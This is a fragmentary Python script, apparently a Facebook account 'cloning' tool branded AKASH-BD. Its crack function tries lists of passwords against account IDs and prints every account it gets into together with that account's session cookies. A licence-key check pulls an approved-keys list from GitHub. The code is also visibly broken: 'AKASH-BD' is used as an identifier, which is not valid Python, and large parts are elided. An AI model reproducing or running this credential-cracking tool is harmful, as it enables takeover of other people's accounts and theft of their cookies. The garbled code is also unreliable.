...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mAKASH-BD')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'AKASH-BD' and password == 'Love':
...
def login():
	banner()
	AKASH-BDj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	AKASH-BDj('\033[0;97m===============================================')
	AKASH-BD= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if AKASH-BD in ['m']:
		public()
	elif AKASH-BD in ['1']:
		crack_file()
	elif AKASH-BD in ['i','0i']:
		result()
	elif AKASH-BD in ['2','02']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[AKASH-BD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#AKASH-BD
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•AKASH-BD-Cp] {idf} • {pw}')     
				...
				#AKASH-BD
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•AKASH-BD-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " AKASH-BD,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/AKASH-404-2052/AKASHBD/blob/main/Approved%20Admin.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+AKASH-BD+''+key1
